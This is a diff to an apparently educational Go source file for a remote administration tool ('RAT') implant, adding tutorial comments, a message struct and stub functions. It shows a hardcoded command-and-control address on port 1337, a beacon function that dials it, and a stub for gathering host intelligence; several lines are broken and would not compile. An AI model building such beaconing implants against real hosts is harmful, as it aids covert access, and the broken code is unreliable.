@@ -1,5 +1,5 @@
 /******************************************************************************
- This is a Remote Administration Tool
+ This is a Remote Administration Tool, Target Binary
     AKA: RAT
 
     written in Golang
@@ -10,12 +10,15 @@
 
     This tutorial assumes some familiarity with programming concepts, languages,
 	 and networking
+
+
 =================================================================
 	KNOWN GOOD DEBIAN VM CONFIGURATION:
 		Project Folder Structure
 			mkdir ~/Desktop/go_practice
 			mkdir ~/Desktop/go_practice/src/
 			touch ~/Desktop/go_practice/src/go_practice.go
+			touch ~/Desktop/go_practice/src/go_practice2.go
 
 		Install the recomended go extension in VSCode
 			- ctrl+shift+p - type in "Go : install tools"
@@ -53,6 +56,9 @@
 	YOU WILL BREAK THE INSTALL (at least I did)
 
 	... Careful changing the formatter to "gofmt" it hung my VM
+
+	USEFUL GO COMMANDS:
+
 */
 
 // make our module
@@ -70,6 +76,19 @@ import (
 	"os"
 	"strings"
 
+	/*/  IMPORTING MODULES YOU FIND ONLINE
+		in the terminal in VSCODE, while in the package root directory,
+		append the following imports, as is, to the command "go get"
+
+		Example:
+
+		go get github.com/hashicorp/mdns
+
+		And it will install the modules to the
+		GOMODCACHE environment variable
+
+	/*/
+
 	// for colorized printing
 	// basic ANSI Escape sequences
 	"github.com/fatih/color"
@@ -81,12 +100,16 @@ import (
 // declaring global variables to share our
 // network information between scopes
 // these are for TCP/UDP specifically
+// instanced without a value assigned
 var local_tcpaddr_LAN net.TCPAddr
 var local_tcpaddr_WAN net.TCPAddr
 var local_udpaddr_LAN net.UDPAddr
 var local_udpaddr_WAN net.UDPAddr
 
 // Command And Control
+// At the top level scope (module level)
+// you declare with a simple "="
+// instanced with a value assigned
 var remote_tcpport string = ":1337"
 var remote_tcpaddr string = "192.168.0.2" + remote_tcpport
 var remote_udpport string = ":1337"
@@ -117,6 +140,11 @@ type Command struct {
 	failure_message string
 }
 
+// Container for Outgoing messages to the Command And Control
+type OutgoingMessage struct {
+	contents string
+}
+
 // Colorized error printing to see what we are doing
 func error_printer(error_object error, message string) {
 
@@ -130,7 +158,7 @@ func error_printer(error_object error, message string) {
 // AFTER AUTH
 func json_extract(
 	pure_json bool,
-	text_from_conn string,
+	text string,
 	command_struct Command) {
 	/*/
 		use Unmarshal if we expect our data to be pure JSON
@@ -138,9 +166,19 @@ func json_extract(
 		we want to store our arsed data in
 	/*/
 	if pure_json == true {
-		json.Unmarshal([]byte(text_from_conn), &command_struct)
+		json.Unmarshal([]byte(text), &command_struct)
 	}
-	decoder, err = json.Decoder(text_from_conn)
+	// read our opened jsonFile as a byte array.
+	//byteValue, _ := ioutil.ReadAll()
+	decoder, err := json.Decoder()
+}
+
+/*/
+Function for packing up a string
+/*/
+func json_pack(json_string string, outgoing_message OutgoingMessage) {
+
+	encoded_json, err := json.Marshal(json_string)
 }
 
 // Beacon
@@ -149,6 +187,15 @@ func json_extract(
 func Bacon() {
 	PHONEHOME_TCP.IP = net.IP(remote_tcpaddr)
 	net.DialTCP(PHONEHOME_TCP)
+}
+
+/*
+Function to gather information about the host
+the rat is in residence on
+*/
+func gather_intel() {
+	// Get all network interfaces
+	interfaces, _ := net.Interfaces()
 }
 
 /*
@@ -193,7 +240,7 @@ func file_hash(path string) {
 		fmt.Println(err)
 		return
 	}
-	//close file when done reading
+	// defer the closing of our File so that we can parse it later on
 	defer file_input.Close()
 
 	/*/
